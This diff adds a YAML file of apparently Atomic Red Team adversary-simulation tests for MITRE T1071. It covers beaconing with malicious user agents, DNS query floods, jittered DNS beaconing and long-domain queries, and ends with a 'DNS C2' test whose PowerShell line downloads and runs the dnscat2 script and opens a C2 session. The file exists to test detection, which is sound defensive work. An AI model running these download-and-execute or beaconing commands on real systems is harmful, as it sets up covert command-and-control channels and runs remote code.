@@ -1,0 +1,193 @@
+---
+attack_technique: T1071
+display_name: Standard Application Layer Protocol
+
+atomic_tests:
+- name: Malicious User Agents - Powershell
+  description: |
+    This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. 
+    Use an application such as Wireshark to record the session and observe user agent strings and responses.
+
+    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: www.google.com
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
+      Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
+      Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
+      Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
+
+- name: Malicious User Agents - CMD
+  description: |
+    This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. 
+    Use an application such as Wireshark to record the session and observe user agent strings and responses.
+
+    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: www.google.com
+  executor:
+    name: command_prompt
+    command: |
+      curl -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1
+      curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1
+      curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1
+      curl -s -A "*<|>*" -m3 #{domain} >nul 2>&1
+
+- name: Malicious User Agents - Nix
+  description: |
+    This test simulates an infected host beaconing to command and control.
+    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+
+  supported_platforms:
+    - linux
+    - macos
+  input_arguments:
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: www.google.com
+  executor:
+    name: sh
+    command: |
+      curl -s -A "HttpBrowser/1.0" -m3 #{domain}
+      curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
+      curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
+      curl -s -A "*<|>*" -m3 #{domain}
+
+- name: DNS Large Query Volume
+  description: |
+    This test simulates an infected host sending a large volume of DNS queries to a command and control server.
+    The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
+    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
+
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: 127.0.0.1.xip.io
+    subdomain:
+      description: Subdomain prepended to the domain name
+      type: string
+      default: atomicredteam
+    query_type:
+      description: DNS query type
+      type: string
+      default: TXT
+    query_volume:
+      description: Number of DNS queries to send
+      type: integer
+      default: 1000
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
+
+- name: DNS Regular Beaconing
+  description: |
+    This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
+    This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
+    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
+
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: 127.0.0.1.xip.io
+    subdomain:
+      description: Subdomain prepended to the domain name
+      type: string
+      default: atomicredteam
+    query_type:
+      description: DNS query type
+      type: string
+      default: TXT
+    c2_interval:
+      description: Seconds between C2 requests to the command and control server
+      type: integer
+      default: 30
+    c2_jitter:
+      description: Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests
+      type: integer
+      default: 20
+    runtime:
+      description: Time in minutes to run the simulation
+      type: integer
+      default: 30
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Set-Location PathToAtomicsFolder
+      .\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
+
+- name: DNS Long Domain Query
+  description: |
+    This test simulates an infected host returning data to a command and control server using long domain names.
+    The simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.
+     Upon execution, DNS information about the domain will be displayed for each callout.
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain:
+      description: Default domain to simulate against
+      type: string
+      default: 127.0.0.1.xip.io
+    subdomain:
+      description: Subdomain prepended to the domain name (should be 63 characters to test maximum length)
+      type: string
+      default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
+    query_type:
+      description: DNS query type
+      type: string
+      default: TXT
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Set-Location PathToAtomicsFolder
+      .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+
+- name: DNS C2
+  description: |
+    This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
+    The following blogs have more information.
+
+    https://github.com/iagox86/dnscat2
+
+    https://github.com/lukebaggett/dnscat2-powershell
+
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain:
+      description: Domain Name configured to use DNS Server where your C2 listener is running
+      type: string
+      default: example.com
+    server_ip:
+      description: IP address of DNS server where your C2 listener is running
+      type: string
+      default: 127.0.0.1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
+      Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
